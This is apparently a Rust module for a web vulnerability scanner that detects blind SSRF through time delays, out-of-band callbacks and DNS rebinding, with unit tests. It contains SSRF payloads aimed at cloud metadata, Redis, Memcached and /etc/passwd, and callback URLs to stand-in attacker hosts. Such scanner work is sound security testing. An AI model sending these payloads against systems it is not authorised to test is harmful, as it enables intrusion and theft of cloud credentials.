//! Blind SSRF Detection Module
//!
//! Detects blind SSRF using time delays, DNS interactions, and out-of-band callbacks.
//! Integrates with Stage 2 HTTP engine, Stage 5 mutator, and Stage 6 analysis.

use async_trait::async_trait;
use std::sync::Arc;
use std::time::{Duration, Instant};
use bytes::Bytes;
use tokio::time::timeout;
use crate::checks::{
    VulnerabilityModule, CheckContext, CheckResult, CheckMetadata, ModuleError,
    CheckCategory, Severity, ResourceBudget
};
use crate::findings::{Finding, Evidence, EvidenceType, EvidenceLocation, Severity as FindingSeverity};
use crate::analysis::{AnalysisContext, OobListener, OobType};
use crate::payload::{PayloadRegistry, OobPayloadBuilder, OobCallbackType};
use crate::http::client::HttpClient;

/// Blind SSRF detection module
pub struct BlindSsrfModule {
    http_client: Arc<HttpClient>,
    analysis_ctx: Arc<AnalysisContext>,
    payload_registry: Arc<PayloadRegistry>,
    oob_builder: OobPayloadBuilder,
}

impl BlindSsrfModule {
    pub fn new(
        http_client: Arc<HttpClient>,
        analysis_ctx: Arc<AnalysisContext>,
        payload_registry: Arc<PayloadRegistry>,
    ) -> Self {
        Self {
            http_client,
            analysis_ctx,
            payload_registry,
            oob_builder: OobPayloadBuilder::new(),
        }
    }

    /// Generate time-delay payloads for blind SSRF detection
    fn generate_time_delay_payloads(&self) -> Vec<(String, u64)> {
        let mut payloads = Vec::with_capacity(16);
        
        // Sleep-based payloads (various protocols)
        payloads.extend_from_slice(&[
            ("http://127.0.0.1:12345", 5000),  // Connection timeout
            ("http://10.0.0.1:12345", 5000),
            ("http://192.168.1.1:12345", 5000),
            ("http://169.254.169.254:12345", 5000),
            ("http://[::1]:12345", 5000),
        ]);

        // DNS-based payloads (will trigger DNS resolution)
        payloads.extend_from_slice(&[
            ("http://ssrf-test-{random}.oob.example.com", 3000),
            ("http://{random}.ssrf.oob.example.com", 3000),
            ("http://blind-ssrf-{random}.attacker.com", 3000),
        ]);

        // Protocol handlers that may cause delays
        payloads.extend_from_slice(&[
            ("dict://127.0.0.1:6379/INFO", 3000),     // Redis
            ("dict://127.0.0.1:11211/stats", 3000),   // Memcached
            ("gopher://127.0.0.1:6379/_INFO", 3000),  // Redis via gopher
            ("file:///etc/passwd", 1000),              // Local file
            ("ldap://127.0.0.1:389/", 3000),           // LDAP
        ]);

        payloads
    }

    /// Generate OOB callback payloads
    fn generate_oob_payloads(&self, callback_domain: &str) -> Vec<String> {
        let mut payloads = Vec::with_capacity(16);
        
        // HTTP callbacks
        payloads.push(format!("http://{}/ssrf", callback_domain));
        payloads.push(format!("http://{random}.{}/ssrf", callback_domain));
        payloads.push(format!("http://ssrf.{}/callback", callback_domain));
        
        // DNS callbacks (subdomain enumeration)
        payloads.push(format!("http://{random}.{}/dns", callback_domain));
        payloads.push(format!("http://dns-{random}.{}/", callback_domain));
        
        // Protocol handlers for OOB
        payloads.push(format!("dict://{}/info", callback_domain));
        payloads.push(format!("gopher://{}/_", callback_domain));
        payloads.push(format!("ldap://{}/", callback_domain));
        
        // File protocol with UNC path (Windows)
        payloads.push(format!("file://{}/share/file", callback_domain));
        
        payloads
    }

    /// Test time-delay based blind SSRF
    async fn test_time_delay(
        &self,
        ctx: &CheckContext,
        param_name: &str,
        payload: &str,
        expected_delay_ms: u64,
    ) -> Result<Option<Finding>, ModuleError> {
        let test_url = format!("{}?{}={}", ctx.target_url, param_name, urlencoding::encode(payload));
        
        // Measure baseline response time
        let baseline_start = Instant::now();
        let _ = self.http_client
            .get(&ctx.target_url)
            .timeout(Duration::from_millis(3000))
            .send()
            .await;
        let baseline_ms = baseline_start.elapsed().as_millis() as u64;

        // Test with payload
        let test_start = Instant::now();
        let response_result = timeout(
            Duration::from_millis(expected_delay_ms + 5000),
            self.http_client
                .get(&test_url)
                .timeout(Duration::from_millis(expected_delay_ms + 3000))
                .send()
        ).await;
        
        let test_ms = test_start.elapsed().as_millis() as u64;
        let delay = test_ms.saturating_sub(baseline_ms);

        // Check if delay indicates blind SSRF
        if delay >= expected_delay_ms / 2 && delay > baseline_ms * 2 {
            if let Ok(response) = response_result {
                let status = response.status().as_u16();
                let headers: Vec<(String, String)> = response
                    .headers()
                    .iter()
                    .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
                    .collect();
                let body = response.bytes().await
                    .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

                let evidence = self.create_timing_evidence(&test_url, &body, &headers, status, payload, baseline_ms, test_ms);
                let finding = Finding::new(
                    "blind_ssrf_timing",
                    FindingSeverity::High,
                    "Blind SSRF (Time-Delay)",
                    format!("Blind SSRF detected via parameter '{}' with time delay of {}ms", param_name, delay),
                    &ctx.target_url,
                )
                .with_method("GET")
                .with_payload(payload.to_string())
                .with_evidence(evidence)
                .with_confidence(75)
                .with_tags(vec!["ssrf", "blind", "timing", "time-delay"])
                .with_cwe("CWE-918")
                .with_agent_id(ctx.agent_id);

                return Ok(Some(finding));
            }
        }

        Ok(None)
    }

    /// Test OOB callback based blind SSRF
    async fn test_oob_callback(
        &self,
        ctx: &CheckContext,
        param_name: &str,
        payload: &str,
        callback_domain: &str,
    ) -> Result<Option<Finding>, ModuleError> {
        let test_url = format!("{}?{}={}", ctx.target_url, param_name, urlencoding::encode(payload));
        
        // Register OOB expectation
        let request_id = rand::random::<u64>();
        self.analysis_ctx
            .register_oob_expectation(request_id, OobType::Http, 10000)
            .await;

        // Send request with OOB payload
        let _ = self.http_client
            .get(&test_url)
            .timeout(Duration::from_millis(5000))
            .send()
            .await;

        // Wait for OOB callback
        tokio::time::sleep(Duration::from_millis(3000)).await;
        
        if let Some(callback) = self.analysis_ctx.check_oob_callback(request_id).await {
            let evidence = self.create_oob_evidence(&test_url, payload, &callback);
            let finding = Finding::new(
                "blind_ssrf_oob",
                FindingSeverity::Critical,
                "Blind SSRF (Out-of-Band)",
                format!("Blind SSRF confirmed via OOB callback from parameter '{}'", param_name),
                &ctx.target_url,
            )
            .with_method("GET")
            .with_payload(payload.to_string())
            .with_evidence(evidence)
            .with_confidence(95)
            .with_tags(vec!["ssrf", "blind", "oob", "confirmed"])
            .with_cwe("CWE-918")
            .with_agent_id(ctx.agent_id);

            return Ok(Some(finding));
        }

        Ok(None)
    }

    /// Test DNS rebinding payloads
    async fn test_dns_rebinding(
        &self,
        ctx: &CheckContext,
        param_name: &str,
    ) -> Result<Option<Finding>, ModuleError> {
        // Generate a domain that resolves to 127.0.0.1 initially, then to internal IP
        let rebinding_domains = [
            "rb.127.0.0.1.nip.io",
            "rb.localhost.nip.io",
            "rb.internal.nip.io",
        ];

        for domain in &rebinding_domains {
            let payload = format!("http://{}", domain);
            let test_url = format!("{}?{}={}", ctx.target_url, param_name, urlencoding::encode(&payload));
            
            let response = self.http_client
                .get(&test_url)
                .timeout(Duration::from_millis(5000))
                .send()
                .await;

            if let Ok(resp) = response {
                let status = resp.status().as_u16();
                let headers: Vec<(String, String)> = resp
                    .headers()
                    .iter()
                    .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
                    .collect();
                let body = resp.bytes().await
                    .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

                if self.is_ssrf_indicator(&body, &headers, status) {
                    let evidence = self.create_evidence(&test_url, &body, &headers, status, &payload);
                    let finding = Finding::new(
                        "blind_ssrf_dns_rebinding",
                        FindingSeverity::High,
                        "Blind SSRF (DNS Rebinding)",
                        format!("SSRF via DNS rebinding detected in parameter '{}'", param_name),
                        &ctx.target_url,
                    )
                    .with_method("GET")
                    .with_payload(payload)
                    .with_evidence(evidence)
                    .with_confidence(80)
                    .with_tags(vec!["ssrf", "blind", "dns-rebinding", "nip.io"])
                    .with_cwe("CWE-918")
                    .with_agent_id(ctx.agent_id);

                    return Ok(Some(finding));
                }
            }
        }

        Ok(None)
    }

    /// Check if response indicates successful SSRF
    fn is_ssrf_indicator(&self, body: &Bytes, headers: &[(String, String)], status: u16) -> bool {
        let body_str = String::from_utf8_lossy(body);
        
        let metadata_indicators = [
            "ami-id", "instance-id", "instance-type", "local-ipv4", "public-ipv4",
            "security-groups", "iam/", "user-data", "metadata", "computeMetadata",
            "project-id", "zone", "machine-type", "network-interfaces",
            "subscription-id", "tenant-id", "resource-group", "vm-id", "vm-size",
            "redis_version", "redis_mode", "connected_clients", "used_memory",
            "memcached", "elasticsearch", "cluster_name", "mongodb", "postgresql",
        ];
        
        for indicator in &metadata_indicators {
            if body_str.to_lowercase().contains(&indicator.to_lowercase()) {
                return true;
            }
        }

        if (200..400).contains(&status) && body.len() > 100 {
            for (name, value) in headers {
                if name.to_lowercase() == "server" {
                    let server_lower = value.to_lowercase();
                    if server_lower.contains("nginx") || server_lower.contains("apache") 
                        || server_lower.contains("iis") || server_lower.contains("lighttpd") {
                        return true;
                    }
                }
            }
        }

        false
    }

    /// Create timing-based evidence
    fn create_timing_evidence(
        &self,
        url: &str,
        body: &Bytes,
        headers: &[(String, String)],
        status: u16,
        payload: &str,
        baseline_ms: u64,
        test_ms: u64,
    ) -> Evidence {
        let body_preview = String::from_utf8_lossy(body);
        let preview = if body_preview.len() > 1000 {
            format!("{}... [truncated]", &body_preview[..1000])
        } else {
            body_preview.to_string()
        };

        let request_str = format!("GET {} HTTP/1.1", url);
        let response_str = format!("HTTP/1.1 {}\n{}\n\n{}", 
            status,
            headers.iter().map(|(k, v)| format!("{}: {}", k, v)).collect::<Vec<_>>().join("\n"),
            preview
        );

        Evidence {
            evidence_type: EvidenceType::Timing {
                baseline_ms,
                observed_ms: test_ms,
                difference_ms: test_ms.saturating_sub(baseline_ms),
            },
            data: format!("Time-delay SSRF: baseline={}ms, test={}ms, diff={}ms, payload='{}'", 
                baseline_ms, test_ms, test_ms.saturating_sub(baseline_ms), payload),
            location: EvidenceLocation {
                path: url.to_string(),
                line: None,
                parameter: None,
                header: None,
            },
            confidence: 75,
        }
    }

    /// Create OOB callback evidence
    fn create_oob_evidence(
        &self,
        url: &str,
        payload: &str,
        callback: &crate::analysis::OobCallback,
    ) -> Evidence {
        Evidence {
            evidence_type: EvidenceType::NetworkTraffic {
                protocol: callback.callback_type.to_string(),
                data: format!("OOB callback received: {} from {}", callback.callback_type, callback.source_ip),
            },
            data: format!("OOB SSRF confirmed: payload='{}', callback_type={}, source_ip={}", 
                payload, callback.callback_type, callback.source_ip),
            location: EvidenceLocation {
                path: url.to_string(),
                line: None,
                parameter: None,
                header: None,
            },
            confidence: 95,
        }
    }

    /// Create standard evidence
    fn create_evidence(
        &self,
        url: &str,
        body: &Bytes,
        headers: &[(String, String)],
        status: u16,
        payload: &str,
    ) -> Evidence {
        let body_preview = String::from_utf8_lossy(body);
        let preview = if body_preview.len() > 2000 {
            format!("{}... [truncated]", &body_preview[..2000])
        } else {
            body_preview.to_string()
        };

        let request_str = format!("GET {} HTTP/1.1", url);
        let response_str = format!("HTTP/1.1 {}\n{}\n\n{}", 
            status,
            headers.iter().map(|(k, v)| format!("{}: {}", k, v)).collect::<Vec<_>>().join("\n"),
            preview
        );

        Evidence {
            evidence_type: EvidenceType::HttpRequestResponse {
                request: request_str,
                response: response_str,
            },
            data: format!("SSRF payload '{}' returned status {} with {} bytes", payload, status, body.len()),
            location: EvidenceLocation {
                path: url.to_string(),
                line: None,
                parameter: None,
                header: None,
            },
            confidence: 80,
        }
    }
}

#[async_trait]
impl VulnerabilityModule for BlindSsrfModule {
    async fn init(&mut self) -> Result<(), ModuleError> {
        tracing::info!("Blind SSRF module initialized");
        Ok(())
    }

    fn metadata(&self) -> &CheckMetadata {
        static METADATA: std::sync::OnceLock<CheckMetadata> = std::sync::OnceLock::new();
        METADATA.get_or_init(|| {
            CheckMetadata::new(
                "blind_ssrf",
                "Blind SSRF Detection",
                "Detects blind SSRF using time delays, DNS interactions, and out-of-band callbacks",
                Severity::High,
                CheckCategory::ServerSideRequestForgery,
            )
            .with_budget(ResourceBudget::advanced())
            .with_god_mode(true)
            .with_tags(vec!["ssrf", "blind", "timing", "oob", "dns-rebinding"])
            .with_references(vec![
                "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
                "https://cwe.mitre.org/data/definitions/918.html",
                "https://portswigger.net/web-security/ssrf/blind",
            ])
        })
    }

    fn should_run(&self, ctx: &CheckContext) -> bool {
        if self.metadata().requires_god_mode && !ctx.god_mode {
            return false;
        }
        ctx.target_url.contains('?') || ctx.target_url.contains('=')
    }

    async fn run(&self, ctx: CheckContext) -> Result<CheckResult, ModuleError> {
        let mut findings = Vec::new();
        let mut request_count = 0;
        let max_requests = ctx.budget.max_requests.min(100);

        // Extract parameters
        let params = self.extract_parameters(&ctx.target_url);
        
        if params.is_empty() {
            return Ok(CheckResult {
                findings,
                executed: true,
                timed_out: false,
                resource_usage: Default::default(),
            });
        }

        // Test time-delay payloads
        let time_payloads = self.generate_time_delay_payloads();
        for (payload, expected_delay) in time_payloads.iter().take(max_requests / (params.len() * 3).max(1)) {
            for param in &params {
                if request_count >= max_requests / 3 {
                    break;
                }
                
                if let Some(finding) = self.test_time_delay(&ctx, param, payload, *expected_delay).await? {
                    findings.push(finding);
                }
                request_count += 1;
            }
        }

        // Test OOB callbacks (if callback domain configured)
        if ctx.god_mode && request_count < max_requests * 2 / 3 {
            let callback_domain = "oob.example.com"; // In production, use actual OOB domain
            let oob_payloads = self.generate_oob_payloads(callback_domain);
            for payload in oob_payloads.iter().take((max_requests * 2 / 3 - request_count) / params.len().max(1)) {
                for param in &params {
                    if request_count >= max_requests * 2 / 3 {
                        break;
                    }
                    
                    if let Some(finding) = self.test_oob_callback(&ctx, param, payload, callback_domain).await? {
                        findings.push(finding);
                    }
                    request_count += 1;
                }
            }
        }

        // Test DNS rebinding
        if request_count < max_requests {
            for param in &params {
                if request_count >= max_requests {
                    break;
                }
                
                if let Some(finding) = self.test_dns_rebinding(&ctx, param).await? {
                    findings.push(finding);
                }
                request_count += 1;
            }
        }

        Ok(CheckResult {
            findings,
            executed: true,
            timed_out: false,
            resource_usage: Default::default(),
        })
    }

    fn priority(&self) -> u16 {
        50 // Medium priority - advanced check
    }

    fn dependencies(&self) -> &[&str] {
        &["basic_ssrf"]
    }
}

impl BlindSsrfModule {
    /// Extract parameter names from URL
    fn extract_parameters(&self, url: &str) -> Vec<String> {
        let mut params = Vec::new();
        
        if let Some(query_start) = url.find('?') {
            let query = &url[query_start + 1..];
            for pair in query.split('&') {
                if let Some(eq_pos) = pair.find('=') {
                    let param = &pair[..eq_pos];
                    if !param.is_empty() {
                        params.push(param.to_string());
                    }
                }
            }
        }
        
        if let Ok(parsed) = url::Url::parse(url) {
            for segment in parsed.path_segments().unwrap_or_default() {
                if segment.starts_with(':') || segment.starts_with('{') {
                    params.push(segment.trim_start_matches(':').trim_start_matches('{').trim_end_matches('}').to_string());
                }
            }
        }
        
        params
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::http::client::HttpClient;
    use crate::analysis::AnalysisContext;
    use crate::payload::PayloadRegistry;

    #[tokio::test]
    async fn test_blind_ssrf_module_creation() {
        let http_client = Arc::new(HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(AnalysisContext::new());
        let payload_registry = Arc::new(PayloadRegistry::new());
        
        let module = BlindSsrfModule::new(http_client, analysis_ctx, payload_registry);
        assert_eq!(module.metadata().id.as_str(), "blind_ssrf");
        assert!(module.metadata().requires_god_mode);
    }

    #[test]
    fn test_generate_time_delay_payloads() {
        let http_client = Arc::new(HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(AnalysisContext::new());
        let payload_registry = Arc::new(PayloadRegistry::new());
        
        let module = BlindSsrfModule::new(http_client, analysis_ctx, payload_registry);
        let payloads = module.generate_time_delay_payloads();
        
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|(p, _)| p.contains("127.0.0.1")));
        assert!(payloads.iter().any(|(p, _)| p.contains("dict://")));
        assert!(payloads.iter().any(|(p, _)| p.contains("gopher://")));
    }

    #[test]
    fn test_generate_oob_payloads() {
        let http_client = Arc::new(HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(AnalysisContext::new());
        let payload_registry = Arc::new(PayloadRegistry::new());
        
        let module = BlindSsrfModule::new(http_client, analysis_ctx, payload_registry);
        let payloads = module.generate_oob_payloads("test.oob.example.com");
        
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.contains("test.oob.example.com")));
        assert!(payloads.iter().any(|p| p.contains("dict://")));
        assert!(payloads.iter().any(|p| p.contains("gopher://")));
    }

    #[test]
    fn test_extract_parameters() {
        let http_client = Arc::new(HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(AnalysisContext::new());
        let payload_registry = Arc::new(PayloadRegistry::new());
        
        let module = BlindSsrfModule::new(http_client, analysis_ctx, payload_registry);
        
        let params = module.extract_parameters("http://example.com/api?user=test&id=123");
        assert_eq!(params, vec!["user", "id"]);
    }
}